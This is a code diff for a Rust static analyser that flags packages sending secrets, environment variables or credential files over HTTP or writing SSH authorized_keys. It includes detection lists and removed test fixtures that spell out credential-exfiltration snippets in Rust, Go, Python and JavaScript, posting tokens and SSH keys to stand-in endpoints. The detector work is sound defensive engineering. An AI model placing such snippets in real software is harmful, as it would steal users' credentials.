+            let bits = (path & PARAM_BITS) | FILE | credential_bits(path);
             out.reads |= bits;
-            if receiver.is_some() && matches!(method, "read_to_end" | "read_to_string") {
+            if receiver.is_some() && read_method {
                 if let Some(buffer) = args.first() {
                     self.bind(*buffer, bits, bindings);
                 }
             }
             return bits;
         }
-        if matches!(
-            name.as_str(),
-            "std::fs::write" | "fs::write" | "os.WriteFile" | "io/ioutil.WriteFile"
-        ) {
+        if is(model.file_write_calls) {
             out.write_path |= bits.first().copied().unwrap_or(0);
             return 0;
         }
-        if matches!(method, "push" | "append" | "extend" | "insert") {
+        if model.append_methods.contains(&method) {
             if let Some(receiver) = receiver {
-                bindings.add_bits(self.text(receiver), all);
+                add_bits(bindings, self.text(receiver), all);
+                return 0;
             }
-            return 0;
         }
         if let Some(summary) = self.summaries.get(&name).cloned() {
             out.body |= substitute(summary.body, &bits);
@@ -1389,7 +1536,7 @@ impl<'s> Analysis<'s> {
             out.reads |= substitute(summary.reads, &bits);
             return substitute(summary.returns, &bits);
         }
-        if request && self.language == Lang::Rust {
+        if sent.is_some() && model.sends_return_builders {
             return REQUEST;
         }
         // An immediately invoked closure executes its body; an uncalled or
@@ -1401,10 +1548,7 @@ impl<'s> Analysis<'s> {
             };
             closure = child;
         }
-        if matches!(
-            closure.kind(),
-            "arrow_function" | "function_expression" | "func_literal"
-        ) {
+        if self.config.is_function(closure) {
             if let Some(body) = closure.child_by_field_name("body") {
                 return self.eval(body, bindings, out, depth + 1);
             }
@@ -1420,31 +1564,92 @@ impl<'s> Analysis<'s> {
         }
         result
     }
+
+    /// `.arg(…)`/`.args(…)` on a `curl` command: the value after a data flag
+    /// is the request body.
+    fn curl_arguments(
+        &mut self,
+        recv: Bits,
+        method: &str,
+        args: &[Node<'_>],
+        bindings: &mut Bindings<'_>,
+        out: &mut Summary,
+        depth: usize,
+    ) -> Bits {
+        let mut state = recv;
+        let command_args = if method == "args" {
+            args.first()
+                .map(|n| {
+                    let mut n = *n;
+                    while n.kind() == "reference_expression" {
+                        let Some(child) = n.named_child(0) else { break };
+                        n = child;
+                    }
+                    named_children(n).collect()
+                })
+                .unwrap_or_default()
+        } else {
+            args.to_vec()
+        };
+        if matches!(method, "arg" | "args") {
+            for arg in command_args {
+                if state & CURL_DATA_NEXT != 0 {
+                    out.body |= self.eval(arg, bindings, out, depth + 1);
+                    out.http = true;
+                    state &= !CURL_DATA_NEXT;
+                } else if matches!(
+                    self.text(arg).trim_matches('"'),
+                    "-d" | "--data" | "--data-raw" | "--data-binary" | "--json" | "-F" | "--form"
+                ) {
+                    state |= CURL_DATA_NEXT;
+                }
+            }
+        }
+        state
+    }
+}
+
+/// The credential bits a file read of `path` adds.
+fn credential_bits(path: Bits) -> Bits {
+    let mut bits = 0;
+    if path & SECRETPATH != 0 {
+        bits |= CREDFILE | SECRET;
+    }
+    if path & CARGOPATH != 0 {
+        bits |= CARGO | CREDFILE | SECRET;
+    }
+    bits
+}
+
+/// The path bits a string literal's text carries.
+fn path_bits(text: &str) -> Bits {
+    let mut bits = 0;
+    if CARGO_CREDENTIAL_PATHS.iter().any(|p| text.contains(p)) {
+        bits |= CARGOPATH | SECRETPATH;
+    }
+    if SECRET_PATHS.iter().any(|p| text.contains(p)) {
+        bits |= SECRETPATH;
+    }
+    if text.contains("authorized_keys") {
+        bits |= AUTHPATH;
+    }
+    if CARGO_CREDENTIAL_NAMES.contains(&text.trim_matches(['\'', '"'])) {
+        bits |= CREDFILENAME;
+    }
+    bits
 }
 
 fn substitute(value: Bits, args: &[Bits]) -> Bits {
-    let mut result = value & !(((1 << PARAM_COUNT) - 1) << PARAM_START);
+    let mut result = value & !PARAM_BITS;
     for index in 0..PARAM_COUNT {
-        let bit = 1 << (PARAM_START + index);
-        if value & bit != 0 {
+        if value & (1 << (PARAM_START + index)) != 0 {
             result |= args.get(index).copied().unwrap_or(0);
         }
     }
     if result & FILE != 0 {
-        if result & SECRETPATH != 0 {
-            result |= CREDFILE | SECRET;
-        }
-        if result & CARGOPATH != 0 {
-            result |= CARGO | CREDFILE | SECRET;
-        }
+        result |= credential_bits(result);
     }
     result
-}
-
-fn is_env_member(canonical: &str) -> bool {
-    canonical.starts_with("os.environ[")
-        || canonical.starts_with("process.env.")
-        || canonical.starts_with("process.env[")
 }
 
 fn env_bits(name: &str) -> Bits {
@@ -1454,16 +1659,7 @@ fn env_bits(name: &str) -> Bits {
         CARGO | SECRET
     } else if name.contains("CARGO_HOME") {
         CARGOHOME
-    } else if [
-        "_TOKEN",
-        "_SECRET",
-        "_PASSWORD",
-        "AWS_ACCESS_KEY_ID",
-        "AWS_SECRET_ACCESS_KEY",
-    ]
-    .iter()
-    .any(|s| name.contains(s))
-    {
+    } else if SECRET_VARIABLES.iter().any(|s| name.contains(s)) {
         SECRET
     } else {
         0
@@ -1471,360 +1667,4 @@ fn env_bits(name: &str) -> Bits {
 }
 
 #[cfg(test)]
-mod tests {
-    use crate::OpenOptions;
-    use std::path::Path;
-    #[test]
-    fn selected_rust_environment_http_payload_is_not_bulk_harvesting() {
-        for source in [
-            "fn run(){let host=std::env::var(\"HOSTNAME\").unwrap();ureq::post(endpoint).send(host);}",
-            "use std::{env,process::Command}; fn run(){let host=env::var(\"HOSTNAME\").unwrap();let payload=format!(\"host={}\",host);Command::new(\"curl\").args(&[\"-X\",\"POST\",endpoint,\"-d\",&payload]).status();}",
-            "fn hostname(){std::env::var(\"HOSTNAME\").unwrap()} fn run(){ureq::post(endpoint).send(hostname());}",
-        ] {
-            let found = kinds("build.rs", source);
-            assert!(found.contains("environment-value-http-body"), "{found:?}");
-            assert!(!found.contains("environment-http-body"), "{found:?}");
-            assert!(!found.contains("secret-http-body"), "{found:?}");
-        }
-    }
-
-    #[test]
-    fn selected_rust_environment_does_not_taint_unrelated_or_metadata_bodies() {
-        for source in [
-            "fn run(){let host=std::env::var(\"HOSTNAME\").unwrap();ureq::post(endpoint).send(\"status\");}",
-            "fn run(){let host=std::env::var(\"HOSTNAME\").unwrap();let host=\"status\";ureq::post(endpoint).send(host);}",
-            "fn run(){let host=std::env::var(\"HOSTNAME\").is_ok();ureq::post(endpoint).send(format!(\"{}\",host));}",
-        ] {
-            let found = kinds("build.rs", source);
-            assert!(!found.contains("environment-value-http-body"), "{found:?}");
-        }
-    }
-
-    #[test]
-    fn rust_secret_metadata_is_not_credential_content() {
-        for expression in [
-            "std::env::var(\"CARGO_REGISTRY_TOKEN\").is_ok()",
-            "std::fs::read_to_string(\"/tmp/.cargo/credentials\").unwrap().len()",
-            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"length {}\", content.len()), Err(_) => String::new() }",
-            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"empty {}\", content.is_empty()), Err(_) => String::new() }",
-        ] {
-            let source =
-                format!("fn run() {{ let data = {expression}; ureq::post(endpoint).send(data); }}");
-            let found = kinds("lib.rs", &source);
-            assert!(
-                !found.contains("cargo-credential-http-body"),
-                "{expression}: {found:?}"
-            );
-            assert!(
-                !found.contains("secret-http-body"),
-                "{expression}: {found:?}"
-            );
-        }
-    }
-
-    #[test]
-    fn rust_match_preserves_content_and_mixed_format_arguments() {
-        for expression in [
-            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => content, Err(_) => String::new() }",
-            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"{}:{}\", content.len(), content), Err(_) => String::new() }",
-            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"{content}\"), Err(_) => String::new() }",
-        ] {
-            let source =
-                format!("fn run() {{ let data = {expression}; ureq::post(endpoint).send(data); }}");
-            assert!(
-                kinds("lib.rs", &source).contains("cargo-credential-http-body"),
-                "{expression}"
-            );
-        }
-    }
-
-    #[test]
-    fn go_package_helpers_keep_file_import_scopes_and_initialization() {
-        let file = |path, source| crate::package_context::SourceFile { path, source };
-        let flow = super::go_package_payload_flow(
-            &[
-                file(
-                    "p/a.go",
-                    "package p\nimport h \"net/http\"\nfunc send(data string){h.Post(endpoint,\"text/plain\",data)}",
-                ),
-                file(
-                    "p/b.go",
-                    "package p\nimport h \"os\"\nfunc secret()string{return h.Getenv(\"GITHUB_TOKEN\")}",
-                ),
-                file("p/c.go", "package p\nfunc init(){send(secret())}"),
-            ],
-            &crate::package_context::ContextLimits::default(),
-        );
-        assert!(!flow.truncated);
-        let events = flow
-            .files
-            .get(2)
-            .and_then(|f| f.facts.get("source.go.initialization_events"))
-            .map(ToString::to_string)
-            .unwrap_or_default();
-        assert!(events.contains("secret-http-body"), "{flow:?}");
-    }
-    #[test]
-    fn helpers_branches_and_blocks_do_not_copy_every_binding() {
-        // Each helper and each `if` branch started from a copy of every
-        // binding in scope, and each block saved one: 5k Go globals × 5k
-        // helpers, or 5k JavaScript bindings then 5k `if`s, took minutes.
-        let globals: String = (0..4_000).map(|i| format!("g{i}=o.Environ()\n")).collect();
-        let helpers: String = (0..4_000).map(|i| format!("func f{i}(){{}}\n")).collect();
-        let go = format!(
-            "package p\nimport (h \"net/http\"; o \"os\"; \"strings\")\nvar (\n{globals}token=o.Getenv(\"GITHUB_TOKEN\")\n)\n{helpers}func init(){{h.Post(endpoint,\"text/plain\",strings.NewReader(token))}}\n"
-        );
-        let bindings: String = (0..4_000).map(|i| format!("var v{i} = {i};\n")).collect();
-        let js = format!(
-            "{bindings}{}var token = 'none';\nif (c) {{ token = process.env.GITHUB_TOKEN; }}\nfetch('https://example.invalid',{{method:'POST',body:token}});\n",
-            "if (c) { let v0 = 1; }\n".repeat(4_000)
-        );
-        for (file, source) in [("p.go", go), ("index.js", js)] {
-            let started = std::time::Instant::now();
-            let events = kinds(file, &source);
-            assert!(
-                started.elapsed() < std::time::Duration::from_secs(10),
-                "{file}"
-            );
-            assert!(events.contains("secret-http-body"), "{file}: {events}");
-        }
-    }
-    #[test]
-    fn go_body_flow_alias_helpers_builders_and_initializers() {
-        let imports = "package p\nimport (h \"net/http\"; o \"os\"; \"bytes\"; \"strings\"; \"context\"; \"io\"; \"net/url\")\n";
-        for body in [
-            "b,_:=o.ReadFile(\"/tmp/fixture/.npmrc\"); h.Post(endpoint,\"text/plain\",bytes.NewReader(b))",
-            "b,_:=o.ReadFile(\"/tmp/fixture/.npmrc\"); r,_:=h.NewRequest(\"POST\",endpoint,bytes.NewReader(b)); h.DefaultClient.Do(r)",
-            "b:=o.Getenv(\"GITHUB_TOKEN\"); r,_:=h.NewRequestWithContext(context.Background(),\"POST\",endpoint,strings.NewReader(b)); c:=&h.Client{}; c.Do(r)",
-            "v:=url.Values{}; v.Set(\"token\",o.Getenv(\"GITHUB_TOKEN\")); h.PostForm(endpoint,v)",
-            "go func(){ h.Post(endpoint,\"text/plain\",strings.NewReader(o.Getenv(\"GITHUB_TOKEN\"))) }()",
-            "h.Post(endpoint,\"text/plain\",strings.NewReader(secret()))",
-        ] {
-            let source = format!(
-                "{imports}func secret()string{{return o.Getenv(\"GITHUB_TOKEN\")}}\nfunc init(){{{body}}}\nfunc init(){{}}\n"
-            );
-            assert!(
-                kinds("p.go", &source).contains("secret-http-body"),
-                "{source}"
-            );
-            let parsed = OpenOptions::new()
-                .path(Path::new("p.go"))
-                .open(source.as_bytes());
-            assert!(
-                parsed
-                    .values()
-                    .get("source.go.initialization_events")
-                    .unwrap()
-                    .to_string()
-                    .contains("secret-http-body")
-            );
-        }
-        for body in [
-            "b:=o.Getenv(\"GITHUB_TOKEN\"); r,_:=h.NewRequest(\"POST\",endpoint,strings.NewReader(\"status\")); r.Header.Set(\"Authorization\",b); h.DefaultClient.Do(r)",
-            "b:=o.Getenv(\"GITHUB_TOKEN\"); r,_:=h.NewRequest(\"POST\",endpoint,nil); r.SetBasicAuth(\"user\",b); h.DefaultClient.Do(r)",
-            "b:=o.Getenv(\"GITHUB_TOKEN\"); b=\"status\"; h.Post(endpoint,\"text/plain\",strings.NewReader(b))",
-            "b:=o.Getenv(\"GITHUB_TOKEN\"); h.NewRequest(\"POST\",endpoint,strings.NewReader(b))",
-        ] {
-            assert_eq!(
-                kinds("p.go", &format!("{imports}func run(){{{body}}}")),
-                "[]",
-                "{body}"
-            );
-        }
-        let source = format!(
-            "{imports}var token=o.Getenv(\"GITHUB_TOKEN\")\nfunc init(){{h.Post(endpoint,\"text/plain\",strings.NewReader(token))}}"
-        );
-        assert!(kinds("p.go", &source).contains("secret-http-body"));
-    }
-    fn kinds(file: &str, source: &str) -> String {
-        let parsed = OpenOptions::new()
-            .path(Path::new(file))
-            .open(source.as_bytes());
-        let events = parsed
-            .values()
-            .get("source.payload_flow.events")
-            .unwrap()
-            .as_array()
-            .unwrap();
-        serde_json::json!(
-            events
-                .iter()
-                .filter(|e| e["kind"]
-                    .as_str()
-                    .is_some_and(|k| k.ends_with("http-body") || k == "ssh-authorized-keys-write"))
-                .collect::<Vec<_>>()
-        )
-        .to_string()
-    }
-    #[test]
-    fn rust_payload_bindings_aliases_and_authentication() {
-        let positive = "use std::{env::{vars as harvest}}; use reqwest::blocking::Client; fn run(){let c=Client::new(); let data=harvest().collect(); c.post(endpoint).json(&data).send();}";
-        assert!(kinds("lib.rs", positive).contains("environment-http-body"));
-        for body in [
-            "let token=std::env::var(\"CARGO_REGISTRY_TOKEN\"); c.get(endpoint).bearer_auth(token).send();",
-            "let data=std::env::vars().collect(); c.post(endpoint).body(\"status\").send();",
-            "let data=std::env::vars().collect(); let data=\"status\"; c.post(endpoint).body(data).send();",
-        ] {
-            assert_eq!(
-                kinds(
-                    "build.rs",
-                    &format!("fn main(){{let c=reqwest::blocking::Client::new();{body}}}")
-                ),
-                "[]",
-                "{body}"
-            );
-        }
-    }
-    #[test]
-    fn long_javascript_member_chain_stays_within_budget() {
-        // Each link used to be evaluated twice, so a few dozen links spent
-        // the whole step budget and hid every later event.
-        let chain = (0..40).fold(String::from("a"), |chain, i| format!("{chain}.p{i}"));
-        let source = format!(
-            "const x={chain}; fetch('https://example.invalid',{{method:'POST',body:JSON.stringify({{token:process.env.GITHUB_TOKEN}})}});"
-        );
-        let parsed = OpenOptions::new()
-            .path(Path::new("index.js"))
-            .open(source.as_bytes());
-        assert_eq!(
-            parsed.values().get("source.payload_flow.truncated"),
-            Some(&serde_json::json!(false))
-        );
-        assert!(kinds("index.js", &source).contains("secret-http-body"));
-    }
-    #[test]
-    fn lexical_shadowing_does_not_leak_or_erase_outer_payload() {
-        assert!(kinds("lib.rs","fn run(){let data=std::env::vars(); {let data=\"constant\";} ureq::post(endpoint).send_json(data);}").contains("environment-http-body"));
-        assert_eq!(
-            kinds(
-                "lib.rs",
-                "fn run(){let data=\"constant\"; if flag {let data=std::env::vars();} ureq::post(endpoint).send_json(data);}"
-            ),
-            "[]"
-        );
-        assert_eq!(
-            kinds(
-                "lib.rs",
-                "use reqwest::blocking::Client; fn run(Client:Custom){let c=Client::new();c.post(endpoint).body(std::env::vars());}"
-            ),
-            "[]"
-        );
-    }
-    #[test]
-    fn rust_helpers_ureq_cargo_home_and_write_path() {
-        assert!(kinds("lib.rs","fn data(){std::env::vars().collect()} fn run(){ureq::post(endpoint).send_json(data());}").contains("environment-http-body"));
-        assert!(kinds("lib.rs","fn run(){let root=std::env::var(\"CARGO_HOME\"); let path=root.join(\"credentials.toml\"); let data=std::fs::read(path); ureq::post(endpoint).send(data);}").contains("cargo-credential-http-body"));
-        assert!(kinds("lib.rs","fn writer(path:&Path,data:&str){std::fs::write(path,data);} fn run(){let path=root.join(\"authorized_keys\");writer(&path, key);}").contains("ssh-authorized-keys-write"));
-        assert_eq!(
-            kinds(
-                "lib.rs",
-                "#[cfg(test)] mod tests {fn run(){ureq::post(endpoint).send_json(std::env::vars());}}"
-            ),
-            "[]"
-        );
-    }
-    /// Code is test-only when any attribute in the run directly before it is
-    /// `#[cfg(test)]` or `#[test]`; anything else in between ends the run.
-    #[test]
-    fn test_attribute_runs_exclude_only_the_item_they_gate() {
-        let send = "{ureq::post(endpoint).send_json(std::env::vars());}";
-        for gated in [
-            format!("#[cfg(test)] #[allow(dead_code)] fn run(){send}"),
-            format!("#[allow(dead_code)] #[test] fn run(){send}"),
-            format!("fn run(){{ #[cfg(test)] {{ let _ = 1; }} #[cfg(test)] {send} }}"),
-        ] {
-            assert_eq!(kinds("lib.rs", &gated), "[]", "{gated}");
-        }
-        for live in [
-            format!("#[inline] fn run(){send}"),
-            format!("#[cfg(test)] fn helper(){{}} fn run(){send}"),
-            format!("#[cfg(test)]\n// note\nfn run(){send}"),
-        ] {
-            assert!(
-                kinds("lib.rs", &live).contains("environment-http-body"),
-                "{live}"
-            );
-        }
-    }
-
-    #[test]
-    fn typed_http_helper_and_curl_payload_only() {
-        assert!(kinds("lib.rs","use reqwest::blocking::Client; fn send(c:&Client,data:&str){c.post(endpoint).body(data).send();} fn run(){let c=Client::new();let data=std::fs::read(path);send(&c,&data);}").contains("file-http-body"));
-        assert!(kinds("lib.rs","fn run(){let data=std::env::vars();std::process::Command::new(\"curl\").arg(\"--data\").arg(data).arg(endpoint).status();}").contains("environment-http-body"));
-        assert_eq!(
-            kinds(
-                "lib.rs",
-                "fn run(){let data=std::env::var(\"CARGO_REGISTRY_TOKEN\");std::process::Command::new(\"curl\").arg(\"--header\").arg(data).arg(endpoint).status();}"
-            ),
-            "[]"
-        );
-    }
-    #[test]
-    fn rust_mutable_read_buffer_and_format_capture() {
-        assert!(kinds("lib.rs","fn run(){let mut f=std::fs::File::open(\"/tmp/input/.ssh/id_rsa\");let mut buf=Vec::new();f.read_to_end(&mut buf);ureq::post(endpoint).send(buf);}").contains("credential-file-http-body"));
-        assert!(kinds("lib.rs","fn run(){let token=std::fs::read_to_string(\"/tmp/input/.terraform.d/credentials.tfrc.json\");ureq::post(endpoint).send(format!(\"{token}\"));}").contains("credential-file-http-body"));
-    }
-    #[test]
-    fn rust_batched_struct_shorthand_payload() {
-        let source = "use reqwest::blocking::Client; fn read(path:&Path){std::fs::read_to_string(path).ok()} fn send(client:&Client,items:&[Item]){let payload=Batch{items};client.post(endpoint).json(&payload).send();} fn run(paths:&[Path]){let client=Client::new();let mut items=Vec::new();for path in paths {if let Some(content)=read(path){items.push(Item{content});}}send(&client,&items);}";
-        assert!(kinds("lib.rs", source).contains("file-http-body"));
-    }
-    #[test]
-    fn helper_parameter_substitution_is_simultaneous() {
-        use super::{PARAM_START, substitute};
-        assert_eq!(
-            substitute(1 << PARAM_START, &[1 << (PARAM_START + 2)]),
-            1 << (PARAM_START + 2)
-        );
-        assert!(kinds("lib.rs", "fn identity(data:&str){data} fn middle(unused:usize,data:&str){ureq::post(endpoint).send(identity(data));} fn run(){middle(0,std::fs::read(path));}").contains("file-http-body"));
-    }
-    #[test]
-    fn sensitive_path_passed_through_read_helper() {
-        assert!(kinds("lib.rs", "fn read(path:&str){std::fs::read(path)} fn run(){ureq::post(endpoint).send(read(\"/tmp/fixture/.cargo/credentials.toml\"));}").contains("cargo-credential-http-body"));
-    }
-    #[test]
-    fn rust_turbofish_preserves_receiver_payload() {
-        assert!(kinds("lib.rs", "fn run(){let data=std::env::vars().map(|(k,v)|format!(\"{k}={v}\")).collect::<Vec<_>>().join(\"\\n\");std::process::Command::new(\"curl\").arg(\"--data\").arg(data).status();}").contains("environment-http-body"));
-    }
-    #[test]
-    fn python_intermediate_helper_session_and_auth() {
-        assert!(kinds("lib.py","import os\nimport requests\ndef harvest():\n return dict(os.environ)\ndef run():\n client=requests.Session()\n data=harvest()\n client.post(endpoint,json=data)\n").contains("environment-http-body"));
-        assert_eq!(
-            kinds(
-                "lib.py",
-                "import os\nimport requests\ndef run():\n token=os.getenv('CARGO_REGISTRY_TOKEN')\n requests.post(endpoint,headers={'Authorization':token},data='status')\n"
-            ),
-            "[]"
-        );
-    }
-    #[test]
-    fn javascript_import_execution_is_not_function_presence() {
-        for (source, expected) in [
-            (
-                "async function f(){await fetch('https://example.invalid');} module.exports=f;",
-                false,
-            ),
-            (
-                "async function f(){await fetch('https://example.invalid');} if(false)f();",
-                false,
-            ),
-            (
-                "async function f(){await fetch('https://example.invalid');} f();",
-                true,
-            ),
-            ("fetch('https://example.invalid');", true),
-        ] {
-            let parsed = OpenOptions::new()
-                .path(Path::new("index.js"))
-                .open(source.as_bytes());
-            assert_eq!(
-                parsed
-                    .values()
-                    .get("source.execution.module_http")
-                    .and_then(|v| v.as_bool()),
-                Some(expected),
-                "{source}"
-            );
-        }
-    }
-}
+mod tests;
